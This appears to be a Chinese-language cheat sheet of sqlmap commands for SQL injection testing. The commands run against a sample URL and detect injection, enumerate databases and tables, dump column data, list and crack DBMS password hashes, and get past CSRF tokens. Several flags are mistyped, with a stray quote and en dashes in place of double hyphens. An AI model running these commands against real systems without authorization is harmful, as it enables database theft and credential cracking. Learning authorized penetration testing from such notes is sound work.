## sqlmap

[github](https://github.com/sqlmapproject/sqlmap)
[doc](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

### 起手式

使用默认行为检测 sql 注入，这也能判断这个点是否是注入点,默认情况下，sqlmap 测试它支持的所有类型/技术。

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --batch
```

爆库， `--dbs` 会枚举出所以数据库

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --dbs
```

### 查看数据

- 查看当前数据库

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --current-db
```

- 查看数据库表

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D my_db --tables“
```

- 枚举数据库表列

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D my_db -T `This_key` --columns
```

- 查看列数据

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" -D my_db -T `This_key` -C `k0y` --dump
```

### 账号密码

检索正在从 Web 应用程序对后端 DBMS 有效执行查询的数据库管理系统用户

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --current-user
```

列出并破解数据库管理系统用户密码哈希值

```bash
python sqlmap.py -u "http://192.168.1.150/products.asp?id=134" --passwords
```

### 绕过 CSRF 保护

现在有很多网站通过在表单中添加值为随机生成的 token 的隐藏字段来防止 CSRF 攻击，sqlmap 会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。

- `–csrf-token`用于指定包含 token 的隐藏字段名，若这个字段名不是常见的防止 CSRF 攻击的字段名 sqlmap 可能不能自动识别出，需要手动指定。如 Django 中该字段名为“csrfmiddlewaretoken”，明显与 CSRF 攻击有关。
- `–csrf-url`用于从任意的 URL 中回收 token 值。若最初有漏洞的目标 URL 中没有包含 token 值而又要求在其他地址提取 token 值时该参数就很有用。

### 强制使用 SSL

指定 `–force-ssl`
